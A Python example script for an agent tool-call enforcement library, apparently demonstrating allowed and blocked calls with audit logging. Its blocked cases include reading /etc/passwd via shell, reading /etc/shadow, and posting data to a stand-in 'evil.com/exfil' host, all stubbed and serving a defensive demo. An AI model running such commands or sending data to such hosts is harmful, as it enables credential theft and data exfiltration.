#!/usr/bin/env python3
"""AriKernel Python basic agent example.

Demonstrates native Python enforcement without a decision server:
- Tool protection with create_kernel + protect_tool
- Allowed and denied tool calls
- Audit log generation with hash-chain integrity

Usage:
    pip install -e python/
    python examples/python-basic-agent.py
    pnpm ari trace --latest --db python-agent-audit.db
"""

import os
import sys

# Ensure the python package is importable from the repo root
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "python"))

from arikernel import create_kernel, protect_tool, ToolCallDenied

AUDIT_DB = "python-agent-audit.db"

# Clean up any previous audit DB
if os.path.exists(AUDIT_DB):
    os.remove(AUDIT_DB)


def main():
    # Create a kernel with the safe-research preset and audit logging
    kernel = create_kernel(
        preset="safe-research",
        principal="python-basic-agent",
        audit_log=AUDIT_DB,
    )

    print(f"AriKernel Python agent started")
    print(f"  Preset:  {kernel.preset}")
    print(f"  Run ID:  {kernel.run_id}")
    print()

    # ── Phase 1: Allowed HTTP GET ──────────────────────────────────

    @protect_tool("http.read", kernel=kernel)
    def fetch_url(url: str) -> str:
        return f"<html>Content from {url}</html>"

    print("1. Fetching URL (should be ALLOWED)...")
    try:
        result = fetch_url(url="https://api.example.com/data")
        print(f"   ALLOWED — {result}")
    except ToolCallDenied as e:
        print(f"   BLOCKED — {e.reason}")

    # ── Phase 2: Allowed file read ─────────────────────────────────

    @protect_tool("file.read", kernel=kernel)
    def read_file(path: str) -> str:
        return f"<contents of {path}>"

    print("\n2. Reading file in safe path (should be ALLOWED)...")
    try:
        result = read_file(path="./data/report.csv")
        print(f"   ALLOWED — {result}")
    except ToolCallDenied as e:
        print(f"   BLOCKED — {e.reason}")

    # ── Phase 3: Denied shell execution ────────────────────────────

    @protect_tool("shell.exec", kernel=kernel)
    def run_command(command: str) -> str:
        return f"output of {command}"

    print("\n3. Running shell command (should be BLOCKED)...")
    try:
        result = run_command(command="cat /etc/passwd")
        print(f"   ALLOWED — {result}")
    except ToolCallDenied as e:
        print(f"   BLOCKED — {e.reason}")

    # ── Phase 4: Denied sensitive file read ────────────────────────

    print("\n4. Reading sensitive file (should be BLOCKED)...")
    try:
        result = read_file(path="/etc/shadow")
        print(f"   ALLOWED — {result}")
    except ToolCallDenied as e:
        print(f"   BLOCKED — {e.reason}")

    # ── Phase 5: Denied HTTP write ─────────────────────────────────

    @protect_tool("http.write", kernel=kernel)
    def post_data(url: str) -> str:
        return f"posted to {url}"

    print("\n5. HTTP POST (should be BLOCKED)...")
    try:
        result = post_data(url="https://evil.com/exfil")
        print(f"   ALLOWED — {result}")
    except ToolCallDenied as e:
        print(f"   BLOCKED — {e.reason}")

    # ── Done ──────────────────────────────────────────────────────

    kernel.close()
    print(f"\nSession complete. Audit log: {AUDIT_DB}")
    print(f"Trace with: pnpm ari trace --latest --db {AUDIT_DB}")


if __name__ == "__main__":
    main()
